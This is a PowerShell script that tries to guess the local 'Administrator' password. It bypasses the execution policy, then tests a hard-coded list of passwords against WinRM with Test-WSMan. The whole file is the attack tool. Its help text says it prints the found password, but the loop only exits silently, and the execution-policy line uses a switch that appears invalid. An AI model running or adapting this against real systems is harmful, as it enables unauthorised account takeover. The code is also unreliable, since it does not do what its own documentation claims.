<#
.SYNOPSIS
    Attempts to brute force the password for a specified user by testing a list of passwords.

.DESCRIPTION
    This script iterates through a list of passwords and attempts to authenticate a specified user using each password.
    If a valid password is found, it outputs the password and stops further attempts.

.PARAMETER user
    The username to authenticate. In this script, it is set to "Administrator".

.PARAMETER passWords
    An array of passwords to test for the specified user.

.NOTES
    This script uses the Test-WSMan cmdlet to test the credentials. If the credentials are valid, it outputs the correct password and exits the loop.

.EXAMPLE
    # Example usage:
    # The script will attempt to authenticate the "Administrator" user with the passwords "Password1", "Password2", "Password3", "Password4", and "Password5".
    # If a valid password is found, it will be printed to the console.
#>
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force -silent

$user = "Administrator"
$passWords = "Password1", "Password2", "Password3", "Password4", "Password5"

foreach ($pass in $passWords) {
    $securePassword = ConvertTo-SecureString $pass -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential($user, $securePassword)

    if (Test-WSMan -Credential $Cred -ErrorAction SilentlyContinue) {
        # Password found, exiting loop
        break
    }
}